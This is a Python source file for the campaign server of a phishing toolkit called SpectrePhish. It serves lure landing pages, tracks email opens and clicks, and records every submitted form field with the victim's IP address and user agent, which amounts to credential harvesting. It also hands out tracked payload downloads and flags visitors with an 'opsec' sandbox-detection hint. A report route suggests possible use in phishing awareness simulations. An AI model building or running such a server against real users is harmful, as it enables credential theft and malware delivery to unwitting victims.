"""
SpectrePhish :: core/server.py
Campaign server: landing pages, tracking, payload delivery, status API.

Routes
  /                    landing for ?t=<token>
  /c/<token>/<n>       click tracker -> 302 to the real destination
  /p/<token>.gif       open pixel
  /s/<token>           landing render (GET) / capture (POST)
  /r/<token>           "this wasn't me" report
  /payload/<file>      tracked payload download
  /api/status          JSON campaign stats

Author : Inayat Hussain
"""

from __future__ import annotations

import base64
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

from config import TRACK_CLICK, TRACK_PAYLOAD, TRACK_PIXEL, TRACK_SUBMIT
from core import render
from core.opsec import sandbox_hint

PIXEL_GIF = base64.b64decode(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")


class Handler(BaseHTTPRequestHandler):
    server_version = "SpectrePhish/1.1"

    def log_message(self, *args):
        pass

    def _store(self):
        return self.server.store

    def _campaign(self):
        return self.server.campaign_id

    def _base(self):
        host = self.headers.get("Host") or f"{self.server.listen}:{self.server.port}"
        scheme = "https" if self.server.tls else "http"
        return f"{scheme}://{host}"

    def _client(self):
        ip = (self.headers.get("X-Forwarded-For", "").split(",")[0].strip()
              or self.client_address[0])
        ua = self.headers.get("User-Agent", "")
        return ip, ua

    def _send(self, code: int, body: bytes, ctype="text/html; charset=utf-8",
              extra=None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("Pragma", "no-cache")
        for key, value in (extra or {}).items():
            self.send_header(key, value)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def _redirect(self, url: str):
        self.send_response(302)
        self.send_header("Location", url)
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Length", "0")
        self.end_headers()

    # ------------------------------------------------------------------
    def do_HEAD(self):  # noqa: N802
        self.do_GET()

    def do_GET(self):  # noqa: N802
        parsed = urlparse(self.path)
        parts = [p for p in parsed.path.split("/") if p]
        store = self._store()
        cid = self._campaign()

        if parts and parts[0] == TRACK_PIXEL:
            token = parts[1].replace(".gif", "") if len(parts) > 1 else ""
            self._track(cid, token, "open")
            return self._send(200, PIXEL_GIF, "image/gif")

        if parts and parts[0] == TRACK_CLICK:
            token = parts[1] if len(parts) > 1 else ""
            index = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
            self._track(cid, token, "click", {"link": index})
            destination = parse_qs(parsed.query).get("u", [None])[0]
            return self._redirect(destination or store.landing_url(cid) or self._base())

        if parts and parts[0] == "r":
            token = parts[1] if len(parts) > 1 else ""
            self._track(cid, token, "report")
            return self._send(200, b"<h3>Reported. Thank you.</h3>")

        if parts and parts[0] == TRACK_SUBMIT:
            token = parts[1] if len(parts) > 1 else ""
            return self._landing(token)

        if parts and parts[0] == TRACK_PAYLOAD:
            return self._payload("/".join(parts[1:]))

        if parts and parts[0] == "api" and len(parts) > 1 and parts[1] == "status":
            stats = store.stats(cid)
            return self._send(200, json.dumps(stats, indent=2).encode(),
                              "application/json")

        token = parse_qs(parsed.query).get("t", [""])[0]
        return self._landing(token)

    def do_POST(self):  # noqa: N802
        parsed = urlparse(self.path)
        parts = [p for p in parsed.path.split("/") if p]
        if not parts or parts[0] != TRACK_SUBMIT:
            return self._send(404, b"not found")

        token = parts[1] if len(parts) > 1 else ""
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length).decode("utf-8", errors="ignore") if length else ""
        data = {k: v[0] for k, v in parse_qs(raw, keep_blank_values=True).items()}

        store = self._store()
        cid = self._campaign()
        ip, ua = self._client()
        data["_ip"] = ip
        data["_ua"] = ua
        store.save_capture(cid, token, data)
        self._track(cid, token, "submit", {"fields": list(data.keys())})

        landing = store.landing(self.server.landing_id) if self.server.landing_id else None
        if landing and landing.get("redirect_url") and landing.get("redirect_on_submit"):
            return self._redirect(landing["redirect_url"])
        return self._send(200, b"<h3>Signed in.</h3>")

    # ------------------------------------------------------------------
    def _landing(self, token: str):
        store = self._store()
        cid = self._campaign()
        landing = store.landing(self.server.landing_id) if self.server.landing_id else None
        if not landing:
            return self._send(404, b"no landing configured")

        html = render.prepare_landing(landing["html"], self._base(), token)
        if token:
            ip, ua = self._client()
            store.set_client_info(cid, token, ua, ip)
        return self._send(200, html.encode())

    def _payload(self, name: str):
        import os
        from config import PAYLOAD_DIR
        safe = os.path.basename(name)
        path = os.path.join(PAYLOAD_DIR, safe)
        if not os.path.isfile(path):
            return self._send(404, b"payload not found")
        cid = self._campaign()
        self._store().note(cid, "", "payload", {"file": safe, "ip": self._client()[0]})
        with open(path, "rb") as handle:
            body = handle.read()
        return self._send(200, body, "application/octet-stream",
                          {"Content-Disposition": f'attachment; filename="{safe}"'})

    def _track(self, cid: int, token: str, kind: str, meta=None):
        if not token:
            return
        store = self._store()
        store.mark(cid, token, kind)
        ip, ua = self._client()
        info = dict(meta or {})
        info["ip"] = ip
        info["ua"] = ua[:180]
        info["sandbox"] = sandbox_hint(ua, ip)
        store.note(cid, token, kind, info)
        if self.server.on_event:
            self.server.on_event(kind, token, info)


class CampaignServer:
    def __init__(self, store, campaign_id: int, landing_id: int | None,
                 listen: str = "0.0.0.0", port: int = 8080,
                 on_event=None, tls: bool = False):
        self.store = store
        self.campaign_id = campaign_id
        self.landing_id = landing_id
        self.listen = listen
        self.port = port
        self.on_event = on_event
        self.tls = tls
        self.httpd = ThreadingHTTPServer((listen, port), Handler)
        self.httpd.daemon_threads = True
        self.httpd.store = store
        self.httpd.campaign_id = campaign_id
        self.httpd.landing_id = landing_id
        self.httpd.listen = listen
        self.httpd.port = port
        self.httpd.tls = tls
        self.httpd.on_event = on_event
        self.thread = None

    def start(self):
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()
        return self

    def serve_forever(self):
        self.httpd.serve_forever()

    def stop(self):
        try:
            self.httpd.shutdown()
            self.httpd.server_close()
        except Exception:
            pass
